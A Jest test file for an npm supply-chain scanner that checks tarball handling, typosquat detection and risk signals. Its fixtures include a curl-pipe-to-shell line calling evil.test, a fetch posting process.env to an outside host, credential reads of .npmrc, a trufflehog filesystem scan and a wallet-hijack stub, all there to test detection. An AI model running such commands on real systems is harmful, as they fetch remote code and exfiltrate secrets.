import { gzipSync } from 'zlib';
import {
    diffPackages,
    editDistance,
    fileSignals,
    obfuscationEvidence,
    scriptSignals,
    typosquatTarget,
} from '../src/supply-chain';
import { matchesIntegrity, readPackageTarball } from '../src/supply-chain/tarball';
import { integrity, tarball } from './helpers/npm-fixtures';

const files = (entries: Record<string, string>) =>
    new Map(Object.entries(entries).map(([k, v]) => [k, Buffer.from(v)]));
const ids = (signals: Array<{ id: string }>) => signals.map((s) => s.id).sort();

describe('package tarballs', () => {
    it('reads files in memory, strips the package root, and supports PAX long names', () => {
        const long = `${'deep/'.repeat(25)}file.js`;
        const read = readPackageTarball(
            tarball({ 'package.json': '{}', 'lib/a.js': 'a', [long]: 'b' }, 'node')
        );
        expect([...read.keys()].sort()).toEqual([long, 'lib/a.js', 'package.json'].sort());
        expect(read.get(long)!.toString()).toBe('b');
    });

    it('never yields paths outside the package and rejects malformed archives', () => {
        const read = readPackageTarball(tarball({ '../../escape.js': 'x', 'ok.js': 'y' }));
        expect([...read.keys()]).toEqual(['ok.js']);
        expect(() => readPackageTarball(gzipSync(Buffer.alloc(600, 1)))).toThrow('Malformed');
    });

    it('checks SRI integrity strings', () => {
        const data = Buffer.from('payload');
        expect(matchesIntegrity(data, integrity(data))).toBe(true);
        expect(matchesIntegrity(Buffer.from('other'), integrity(data))).toBe(false);
        expect(matchesIntegrity(data, 'md5-abc')).toBe(false);
    });
});

describe('code signals', () => {
    it('flags a chalk/debug-style wallet hijack added to a previously clean file', () => {
        const before = files({ 'index.js': 'export default function chalk() {}\n' });
        const payload = `const _0x1a2b=['a'];${Array.from({ length: 25 }, (_, i) => `_0x${(4096 + i).toString(16)}`).join(';')};window.ethereum.request({method:'eth_sendTransaction'});`;
        const after = files({ 'index.js': `export default function chalk() {}\n${payload}` });
        const diff = diffPackages(before, after);
        expect(ids(diff.signals)).toEqual(['global-hook', 'obfuscation']);
        expect(diff.filesChanged).toEqual(['index.js']);
    });

    it('flags Shai-Hulud-style worm behavior: secret scanner, workflow, and credential reads', () => {
        const before = files({ 'index.js': 'module.exports = 1;' });
        const after = files({
            'index.js': 'module.exports = 1;',
            'bundle.js':
                "require('child_process').execSync('trufflehog filesystem /'); fs.readFileSync(home + '/.npmrc')",
            '.github/workflows/shai-hulud.yml': 'on: push',
            'bin/x.node': '\0binary',
        });
        const diff = diffPackages(before, after);
        expect(ids(diff.signals)).toEqual([
            'binary',
            'ci-workflow',
            'credential-access',
            'process-spawn',
            'secret-scanner',
        ]);
        expect(diff.filesAdded).toHaveLength(3);
    });

    it('does not repeat behavior the previous release already had', () => {
        const source =
            "const https = require('https'); module.exports = () => https.get('https://x');";
        const diff = diffPackages(
            files({ 'index.js': source }),
            files({ 'index.js': `${source}\n// v2` })
        );
        expect(diff.signals).toEqual([]);
    });

    it('detects curl-pipe-shell, env harvesting, dynamic code, and minified rewrites', () => {
        expect(
            ids(fileSignals('install.sh', Buffer.from('curl -s https://evil.test/x | sh')))
        ).toEqual(['download-and-execute']);
        expect(
            ids(
                fileSignals(
                    'a.js',
                    Buffer.from(
                        'fetch("https://x.test", {body: JSON.stringify(process.env)}); eval(code)'
                    )
                )
            )
        ).toEqual(['dynamic-code', 'env-harvest', 'network']);
        const diff = diffPackages(
            files({ 'lib.js': 'a\nb\n' }),
            files({ 'lib.js': 'x'.repeat(25000) })
        );
        expect(ids(diff.signals)).toEqual(['minified-rewrite']);
        expect(fileSignals('README.md', Buffer.from('curl x | sh'))).toEqual([]);
        expect(obfuscationEvidence('\\x41'.repeat(1000))).toContain('escapes');
    });

    it('treats added or rewritten lifecycle scripts as high risk', () => {
        const added = scriptSignals(
            { scripts: {} },
            { scripts: { postinstall: 'node bundle.js' } }
        );
        expect(added).toEqual([
            expect.objectContaining({ id: 'install-script-added', severity: 'high' }),
        ]);
        const changed = scriptSignals(
            { scripts: { install: 'node a.js' } },
            { scripts: { install: 'curl https://x.test | bash' } }
        );
        expect(ids(changed)).toEqual(['download-and-execute', 'install-script-changed']);
        expect(scriptSignals({ scripts: { install: 'x' } }, { scripts: { install: 'x' } })).toEqual(
            []
        );
        expect(scriptSignals(undefined, { scripts: { preinstall: 'x' } })[0].severity).toBe(
            'medium'
        );
    });
});

describe('typosquats', () => {
    it.each([
        ['lodahs', 'lodash'],
        ['expresss', 'express'],
        ['chalkjs', 'chalk'],
        ['react_dom', 'react-dom'],
        ['@evil/core', undefined],
        ['@angullar/core', '@angular/core'],
        ['@nestjs-fake/core', undefined],
        ['@types/nodee', '@types/node'],
        ['lodash', undefined],
        ['my-unique-tool', undefined],
        ['ms', undefined],
    ])('%s -> %s', (name, expected) => {
        expect(typosquatTarget(name)).toBe(expected);
    });

    it('computes transposition-aware edit distance', () => {
        expect(editDistance('lodash', 'lodahs')).toBe(1);
        expect(editDistance('abc', 'abcdefgh', 2)).toBe(3);
    });
});

describe('noise controls', () => {
    it('ignores prepare scripts, type declarations, and downgrades test fixtures', () => {
        expect(scriptSignals({ scripts: {} }, { scripts: { prepare: 'husky install' } })).toEqual(
            []
        );
        expect(
            fileSignals('index.d.ts', Buffer.from("declare function fetch('https://x')"))
        ).toEqual([]);
        expect(fileSignals('test/fixture.js', Buffer.from('eval(x)'))[0].severity).toBe('low');
        expect(
            fileSignals('lib/a.spec.ts', Buffer.from("require('child_process')"))[0].severity
        ).toBe('low');
        expect(fileSignals('lib/run.js', Buffer.from('eval(x)'))[0].severity).toBe('medium');
    });
});
